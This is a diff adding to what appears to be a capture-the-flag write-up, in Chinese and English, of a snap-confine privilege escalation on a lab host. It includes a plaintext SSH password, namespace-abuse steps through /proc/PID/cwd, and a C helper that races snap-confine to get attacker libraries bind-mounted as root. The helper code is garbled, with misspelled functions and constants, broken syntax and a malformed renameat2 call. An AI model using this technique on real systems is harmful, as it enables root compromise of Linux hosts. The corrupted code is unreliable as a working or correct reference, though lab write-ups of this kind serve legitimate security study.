@@ -428,13 +428,15 @@ bash: /usr/bin/snap: Permission denied
 ```
 jonathan@snapped:/home/jonathan$ cd /tmp       
 jonathan@snapped:/tmp$ echo $$
-2850
+3482
 jonathan@snapped:/tmp$ 
 jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done
 
 jonathan@snapped:/tmp$ stat ./.snap
 stat: cannot statx './.snap': No such file or directory
 ```
+#### 进入 Firefox snap 沙盒并记下其进程 ID。此进程维持着沙盒的挂载名称空间的运行，其 /tmp 目录在主机上由 /tmp/snap-private-tmp/snap.firefox/tmp/ 提供支持。
+#### 使用 `touch` 保持 `/tmp` 目录处于活跃状态，同时让 `.snap` 进入休眠状态。30 天后（或手动运行 `systemctl start systemd-tmpfiles-clean.service`），清理程序会将其删除。保持终端 1 打开
 ----------------------------------------------------------------------
 (Terminal 2)
 ----------------------------------------------------------------------
@@ -443,11 +445,217 @@ stat: cannot statx './.snap': No such file or directory
 [★]$ ssh jonathan@snapped.htb
 jonathan@snapped.htb's password: linkinpark
 
-jonathan@snapped:/tmp$ cd /proc/2850/cwd
-jonathan@snapped:/proc/2850/cwd$ ls -la
+jonathan@snapped:/tmp$ cd /proc/3482/cwd
+jonathan@snapped:/proc/3482/cwd$ ls -la
 total 4
 drwxrwxrwt  2 root root 4096 Apr  8 09:09 .
 drwxr-xr-x 21 root root  540 Apr  8 09:05 ..
+```
+#### /proc/PID/cwd 会遵循该进程的挂载命名空间视图，从而绕过了 /tmp/snap-private-tmp/ 上 700 权限（即根用户对根目录的权限）的限制。
+#### 使用 --base snapd（无效）会删除缓存的挂载命名空间，但会保留 /tmp 目录。systemd-run 包装器满足了 snap 的 cgroup 要求。出现这个错误是意料之中的，因为失败行为正是导致命名空间被破坏的原因。
+#### 我们对本文末尾所包含的辅助程序和附加文件进行了编译和上传。该辅助程序会重新创建 .snap（由攻击者控制的文件），将 285 个真实的库复制到 .exchange 文件夹中，启动 snapconfine 并通过一个小型套接字限制调试输出，检测绑定挂载触发器，并通过 renameat2(RENAME_EXCHANGE) 原子性地交换目录。snap-confine 会恢复运行并以 root 身份绑定挂载我们的文件。我们需要保持这个终端窗口打开，以使进程保持运行状态，从而保持我们被污染的命名空间的运行状态。
+```
+[★]$ cat firefox_2024.c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <errno.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/syscall.h>
+#define SNAP_CONFINE "/usr/lib/snapd/snap-confine"
+#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"
+#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"
+#define REAL_LIBDIR "/snap/core22/current/usr/lib/x86_64-linux-gnu"
+#define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""
+
+static int copy_file(const char *src, const char *dst) {
+		int fds = open(src, O_RDONLY);
+		if (fds < 0) return -1;
+		int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+		if (fdd < 0) { close(fds); return -1; }
+		char buf[65536];
+		ssize_t n;
+		while ((n = read(fds, buf, sizeof(buf))) > 0)
+				write(fdd, buf, n);
+		close(fds);
+		close(fdd);
+		return 0;
+}
+static int setup_snap_and_exchange(const char *payload_so) {
+		mkdir(".snap", 0755);
+		mkdir(".snap/usr", 0755);
+		mkdir(".snap/usr/lib", 0755);
+		mkdir(".snap/usr/local", 0755);
+		mkdir(".snap/snap", 0755);
+		mkdir(".snap/snap/firefox", 0755);
+		DIR *d = opendir("/snap/firefox");
+		if (d) {
+				struct dirent *ent;
+				while ((ent = readdir(d)) != NULL) {
+						if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {
+								char p[512];
+								snaprint(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);
+								mkdir(p, 0755);
+								snaprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);
+								mkdir(p, 0755);
+						}
+				}
+				closedir(d);
+		}
+		mkdir(EXCHANGE_SRC, 0755);
+
+		d = opendir(REAL_LIBDIR);
+		if (!d) { perror("opendir real libdir"); return -1l }
+
+		int count = 0;
+		struct dirent *ent;
+		while ((ent = readdir(d)) != NULL) {
+				if (ent->d_name[0] == '.' &&
+								(ent->d_name[1] == '\0' ||
+				 						(ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
+						continue;
+
+				char src[4096], dst[4096];
+				snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);
+				snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);
+
+				struct stat st;
+				if (lstat(src, &st) < 0) continue;
+
+				if (S_ISDIR(st.st_name)) {
+						mkdir(dst, 0755);
+				} else if (S_ISLNK(st.st_mode)) {
+					  char liink[4096];
+				    ssize_t len = readlink(src, link, sizeof(link) -1);
+					  if (len >0) { link[len] = '\0'; symlink(link, dst); }
+				} else {
+						copy_file(src, dst);
+				}
+				count++;
+		}
+		closedir(d);
+
+		printf("[*] Exchange dir ready: %d entries in  %s\n", count EXCHANGE_SRC);
+		return 0;
+}
+
+static int create_stderr_socket(int *read_fdm int *write_fd) {
+		int sv[2];
+		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
+				perror("socketpair"); return -1;
+		}
+		int bufsize = 1;
+		setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
+		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+		setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
+		setsockopt(sv[1], SOL_SOCKET, SO_SNFBUF, &bufsize, sizeof(bufsize));
+		*read_fd = sv[0];
+		*write_fd = sv[1];
+		return 0;
+}
+
+static int run_and_race(void) {
+		int read_fd, write_fd;
+		if (create_stderr_socket(&read_fd, &write_fd) < 0) return -1;
+
+		pid_t pid= fork();
+		if (pid <0 ) { perror("fork"); return -1; }
+
+		if (pid ==0) {
+				close(read_fd);
+				dup2(write_fd, STDERR_FILENO);
+				close(write_fd);
+				clearenv();
+				setenv("SNAPD_DEBUG", "1", 1);
+				setenv("SNAP_INSTANCE_NAME", "firefox", 1);
+				execl(SNAP_CONFINE, "snap-confine",
+								"--base", "core22",
+								"snap.firefox.hook.configure",
+								"/bin/sh", "-c",
+								"echo $$ > /tmp/race_pid.txt;"
+								"star -c '%U:%G %a' /usr/lib/x86_64-linux-gun/ld-linux-x86-64.so.2 "
+								"> /tmp/race_perms.txt 2>&1; "
+								"sleep 99994",
+								NULL);
+				_exit(1);
+		}
+
+		close(write_fd);
+
+		char ringbuf[4096];
+		int ringpos = 0;
+		memset(ringbuf, 0, sizeof(ringbuf));
+		int tlen = strlen(TRIGGER);
+		char byte;
+		ssize_t n;
+		int swapped = 0;
+
+		prntf("[*} Reading snap-config output (PID %d)...\n", pid);
+
+		while ((n = read(read_fd, &byte, 1)) > 0) {
+				write(STDOUT_FILENO, &byte, 1);
+
+				ringbuf[ringpos %  sizeof(ringbuf)] = byte;
+				ringpos++;
+
+				if (!swapped && ringpos >= tlen) {
+						char check[512];
+						for (int i = 0; i < tlen && i< (int)sizeof(check) -1; i++)
+								check[i] = ringbuf[(ringpos - tlen + i) % sizeof(ringbuf)];
+						check[tlen] = '\0';
+
+						if (strstr(check, TRIGGER)) {
+								printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
+
+								if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE) == 0) {
+										/* atomic swap succeeded */
+								} else {
+									   rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gun.orig");
+									   rename(EXCHANGE_SRC, EXCHANGE_DST);
+								}
+
+								swapped = 1;
+								printf("[+] SWAP DONE! Race won.\n");
+								printf("[*] Do NOT close this terminal.\n");
+						}
+				}
+		}
+
+		close(read_fd);
+		int status;
+		waitpid(pid, &status, 0);
+
+		if (swapped)
+				printf("[+] Race won! Our libraries are in namespace.\n");
+		else
+				printf("[-] Trigger not detected. Race lost.\n");
+
+		return swapped ? 0 : -1;
+}
+
+int main(int argc, char *argv[]) {
+		if (argc <2) {
+				fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
+				return 1;
+		}
+		printf("[*] CVE-2026-3888 - firefox 24.04 helper\n");
+		printf("[*] CWD: "); fflush(stdout); system("pwd");
+		printf("[*] Setting up .snap and .exchange directory...\n");
+		if (setup_snap_and_exchange(argv[1]) < 0) return 1;
+		printf("[*] Starting race against snap-confine...\n");
+		if (run_and_race() < 0) return 1;
+		printf("[*] Done. Re-enter sandbox to exploit.\n");
+		return 0;
+}
 ```
 #### Step 4 — Destroy cached namespace 
 #### Step 5 — Win the race 
